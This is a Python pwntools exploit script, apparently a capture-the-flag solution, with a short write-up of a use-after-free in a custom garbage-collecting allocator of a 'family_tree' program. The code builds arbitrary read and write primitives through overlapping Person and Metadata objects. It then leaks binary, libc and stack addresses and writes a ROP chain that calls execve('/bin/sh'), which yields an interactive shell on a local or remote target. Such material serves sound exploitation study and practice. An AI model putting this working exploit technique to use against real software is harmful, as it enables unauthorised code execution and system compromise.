#!/usr/bin/python
#coding=utf-8

"""
Write up:

The application allows us to create more or less arbitrary graphs of
'person' objects. The twist is that these objects are allocated by a custom
allocator, which implements a rudimentary garbage collection mechanism.

The garbage collector uses a tri-colour mark and sweep algorithm to decide
which objects to free; it traverses the tree from the root, marking objects it
can reach, and finishes by sweeping accross the heap and freeing any objects
that are not marked. 

The collection is triggered automatically in `FTAllocator::Alloc()` when the 
allocator's memory is exhausted. The issue is that `FTAllocator::Collect()` is
only called after an allocation has already been passed by the freelist, but 
not yet used to create a `Person`. This means that `FTAllocator::Collect()`
will fail to mark this 'in use' allocation and free it, allowing for the same
allocation to be used twice. With the same allocation used to service a 
`Person` and a `Metadata` object, an arbitrary read/write primitive can be
established which can be used to perform a series of leaks (binary -> libc -> stack) 
to ultimately write a ROP chain to the stack to gain code execution.
"""
 
from asyncore import read
from re import L
from pwn import *
 
 
context.log_level = "debug"

is_local = False
is_remote = False
 
if len(sys.argv) == 1:
    is_local = True
    p = process("./family_tree", env={"LD_PRELOAD":"./libc-2.27.so"})
 
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
 
 
 
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
 
 
def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)
 

sla(">", "person foo ROOT")
for i in range(28):

    sla(">", f"person {chr(0x41+i)*32} ROOT")


sla(">", "delete ROOT." + "A"*32 )
sla(">", "delete ROOT." + "B"*32 )
sla(">", "delete ROOT." + "C"*32 )
sla(">", "delete ROOT." + "D"*32 )
sla(">", "person controller ROOT")
sla(">", "metadata ROOT.controller")
sla("metadata>", "A"*32)
sla(">", "person target ROOT")
sla(">", "metadata ROOT.target")
sla("metadata>", "B"*32)
sla(">", "dump ROOT.controller")

initial = p.recvline()
print(initial)
target_addr = u64(initial[7:15])
target_name_length = u64(initial[15:23])
target_name = u64(initial[23:31])
target_name2 = u64(initial[31:39])
metadata = u64(initial[39: 47])
list_start = u64(initial[47:55])
list_end = u64(initial[55:63])


log.info(hex(target_addr))

def read64(addr):



    fake_obj = b"\0\0\0\0\0\0"   + \
            p64(target_addr)  + \
            p64(target_name_length) + \
            p64(target_name)  + \
            p64(target_name2) + \
            p64(addr - 10)     + \
            p64(list_start)   + \
            p64(list_end)    

    sla(">", "metadata ROOT.controller")
    sla("metadata>", fake_obj)
    sla(">", "dump ROOT.target")

    leak = p.recvline()
    val = u64(leak[1:9].ljust(8, b'\x00'))

    return val


def write64(addr, value):

    fake_obj = b"\0\0\0\0\0\0"   + \
            p64(target_addr)  + \
            p64(target_name_length) + \
            p64(target_name)  + \
            p64(target_name2) + \
            p64(addr)     + \
            p64(list_start)   + \
            p64(list_end)    

    sla(">", "metadata ROOT.controller")
    sla("metadata>", fake_obj)
    sla(">", "metadata ROOT.target")
    sla("metadata>", value)




vtable = read64(target_addr - 32)

log.info("vtable leak: " + hex(vtable))

bin_base = vtable - (0x55d2a6a0ec10 - 0x000055d2a6800000)

log.info("bin_base: " + hex(bin_base))

stdout_leak = bin_base + (0x560ccd20f020 - 0x0000560ccd000000)

log.info("stdout_leak: " + hex(stdout_leak))
libc_leak = read64(stdout_leak)

log.info("libc_leak: " + hex(libc_leak))

libc_base = libc_leak - 0x00000000003ec760

log.info("libc_base: " + hex(libc_base))

environ = libc_base + 0x00000000003ee098

log.info("environ: " + hex(environ))

stack_leak = read64(environ)

log.info(hex(stack_leak))

stack_target = stack_leak - (0x7fffb4b5b7e8 - 0x00007fffb4b5b408)

leaked_stack_contents = read64(stack_target)

sla(">", "dump ROOT.target")

leaked_stack_contents = p.recvline()

log.info("stack target: " + hex(stack_target))

new_stack = b""

for i in range(0xe):
    if i == 0:
        new_stack += p64(libc_base + 0x4f302)
    if i == 8:
        new_stack += p64(0)
    else:
        new_stack += p64(u64(leaked_stack_contents[i*8 + 1: (i+1)*8 + 1]))

fake_obj = b"\0\0\0\0\0\0"   + \
        p64(target_addr)  + \
        p64(target_name_length) + \
        p64(target_name)  + \
        p64(target_name2) + \
        p64(stack_target - 10)     + \
        p64(list_start)   + \
        p64(list_end)    

sla(">", "metadata ROOT.controller")
sla("metadata>", fake_obj)
g = lambda x : p64(x + libc_base)


pop_rdi = g(0x000000000002164f)
pop_rsi =  g(0x0000000000023a6a)
pop_rdx = g(0x0000000000001b96)
pop_rax = g(0x000000000001b500)
binsh = g(0x1b3d88)
syscall = g(0x00000000000d2625)

chain = pop_rdi + binsh + pop_rsi + p64(0) + pop_rdx + p64(0) + pop_rax + p64(0x3b) + syscall

sla(">", "metadata ROOT.target")
sa("metadata>", chain)

p.interactive()
